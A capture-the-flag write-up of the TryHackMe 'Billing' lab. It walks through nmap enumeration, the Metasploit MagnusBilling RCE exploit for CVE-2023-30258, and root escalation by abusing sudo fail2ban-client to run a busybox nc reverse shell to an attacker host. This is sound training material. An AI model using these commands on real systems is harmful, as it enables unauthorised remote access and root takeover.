---
title: "Billing"
date: 2025-03-10
image: /assets/img/tryhackme/Billing/Billing_image.jpg
description: Writeup of the TryHackMe-CTF Billing
categories: [Tryhackme, Easy]
tags: [linux, metasploit, web, privesc]
---

## Challenge Description
<center>
<table>
  <tr>
    <td>Platform</td>
    <td>TryHackMe</td>
  </tr>
  <tr>
    <td>Name</td>
    <td>Billing</td>
  </tr>
  <tr>
    <td>Description</td>
    <td>Some mistakes can be costly.</td>
  </tr>
  <tr>
    <td>Difficulty</td>
    <td>Easy</td>
  </tr>
  <tr>
    <td>OS</td>
    <td>Linux</td>
  </tr>
  <tr>
    <td>Link</td>
    <td><a href="https://tryhackme.com/room/billing">https://tryhackme.com/room/billing</a></td>
  </tr>
</table>
</center>

This writeup is a possible solution of the CTF-challenge Billing.  

## Enumeration
I started the enumeration using `nmap`:
```bash
$ nmap -p- 10.10.46.219         
  Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-08 05:13 EST
  Nmap scan report for 10.10.46.219
  Host is up (0.046s latency).
  Not shown: 65531 closed tcp ports (conn-refused)
  PORT     STATE SERVICE
  22/tcp   open  ssh
  80/tcp   open  http
  3306/tcp open  mysql
  5038/tcp open  unknown

  Nmap done: 1 IP address (1 host up) scanned in 22.38 seconds
```
and enumerated the found services in more depth using nmap's `-A` flag:
```bash
$ nmap -A -p 22,80,3306,5038 10.10.46.219
  Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-08 05:14 EST
  Nmap scan report for 10.10.46.219
  Host is up (0.042s latency).

  PORT     STATE SERVICE  VERSION
  22/tcp   open  ssh      OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
  | ssh-hostkey: 
  |   3072 79:ba:5d:23:35:b2:f0:25:d7:53:5e:c5:b9:af:c0:cc (RSA)
  |   256 4e:c3:34:af:00:b7:35:bc:9f:f5:b0:d2:aa:35:ae:34 (ECDSA)
  |_  256 26:aa:17:e0:c8:2a:c9:d9:98:17:e4:8f:87:73:78:4d (ED25519)
  80/tcp   open  http     Apache httpd 2.4.56 ((Debian))
  | http-robots.txt: 1 disallowed entry 
  |_/mbilling/
  | http-title:             MagnusBilling        
  |_Requested resource was http://10.10.46.219/mbilling/
  |_http-server-header: Apache/2.4.56 (Debian)
  3306/tcp open  mysql    MariaDB (unauthorized)
  5038/tcp open  asterisk Asterisk Call Manager 2.10.6
  Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
  Nmap done: 1 IP address (1 host up) scanned in 8.34 seconds
```
From here I proceeded the analysis port by port.

## Port 80 Analysis

The webserver showed the login page of MagnusBilling, which is an open-source billing system for VoIP-services:

![MagnusBilling login](/assets/img/tryhackme/Billing/thm_billing_1.jpg)

I checked for potential vulnerabilities in `metasploit` and found an interesting exploit:
```bash
msf6 > search MagnusBilling

Matching Modules
================

   #  Name                                                        Disclosure Date  Rank       Check  Description
   -  ----                                                        ---------------  ----       -----  -----------
   0  exploit/linux/http/magnusbilling_unauth_rce_cve_2023_30258  2023-06-26       excellent  Yes    MagnusBilling application unauthenticated Remote Command Execution.
   1    \_ target: PHP                                            .                .          .      .
   2    \_ target: Unix Command                                   .                .          .      .
   3    \_ target: Linux Dropper                                  .                .          .      .

```

After loading the module, I set the required options and executed the exploit: 
```bash
msf6 exploit(linux/http/magnusbilling_unauth_rce_cve_2023_30258) > set RHOSTS 10.10.251.160
RHOSTS => 10.10.251.160
msf6 exploit(linux/http/magnusbilling_unauth_rce_cve_2023_30258) > set SRVHOST [attackerip]
SRVHOST => [attackerip]
msf6 exploit(linux/http/magnusbilling_unauth_rce_cve_2023_30258) > set LHOST [attackerip]
LHOST => [attackerip]
msf6 exploit(linux/http/magnusbilling_unauth_rce_cve_2023_30258) > exploit

[*] Started reverse TCP handler on 10.21.63.26:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[*] Checking if 10.10.251.160:80 can be exploited.
[*] Performing command injection test issuing a sleep command of 5 seconds.
[*] Elapsed time: 5.15 seconds.
[+] The target is vulnerable. Successfully tested command injection.
[*] Executing PHP for php/meterpreter/reverse_tcp
[*] Sending stage (39927 bytes) to 10.10.251.160
[+] Deleted lTTlGxPShDz.php
[*] Meterpreter session 1 opened ([attackerip]:4444 -> 10.10.251.160:39784) at 2025-03-08 05:38:44 -0500

meterpreter > 
```

With this initial access, I successfully retrieved the user flag:
```bash
meterpreter > shell
  Process 1750 created.
	Channel 0 created.
whoami
	asterisk
cd /home
ls
	magnus
cd magnus
ls
  Desktop
  Documents
  Downloads
  Music
  Pictures
  Public
  Templates
  Videos
  user.txt
cat user.txt
  THM{[removed]}
```

## Privilege Escalation root

To obtain a more stable shell, I switched to `penelope`:

![Switch to penelope](/assets/img/tryhackme/Billing/thm_billing_2.jpg)

I continued with `sudo -l` and got the following output:
```bash
asterisk@Billing:/home$ sudo -l
Matching Defaults entries for asterisk on Billing:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

Runas and Command-specific defaults for asterisk:
    Defaults!/usr/bin/fail2ban-client !requiretty

User asterisk may run the following commands on Billing:
    (ALL) NOPASSWD: /usr/bin/fail2ban-client
```

After researching Fail2Ban, I discovered that it is possible to execute Bash commands in addition to network block events. Before I started to missuse this I checked if I can control `fail2ban`:
```bash
asterisk@Billing:/home$ sudo fail2ban-client restart
  Shutdown successful
  Server ready
```

Great! Using this, I misused it with an additional ban-action:
```bash
asterisk@Billing:/var/tmp$ sudo /usr/bin/fail2ban-client set sshd action iptables-multiport actionban "/bin/bash -c 'busybox nc [attackerip] 9001 -e bash'"
```

Finally, I started a listener and triggered this by manually blocking an IP address in the `sshd jail`: 
```bash
asterisk@Billing:/var/tmp$ sudo /usr/bin/fail2ban-client set sshd banip 10.11.12.13
```

I successfully established the connection and retrieved the root flag.:
```bash
$ nc -lvnp 9001                 
listening on [any] 9001 ...
connect to [attackerip] from (UNKNOWN) [10.10.251.160] 47964
whoami
	root
cd /root
ls
	filename
	passwordMysql.log
	root.txt
cat root.txt
	THM{[removed]}
```

solved! :)
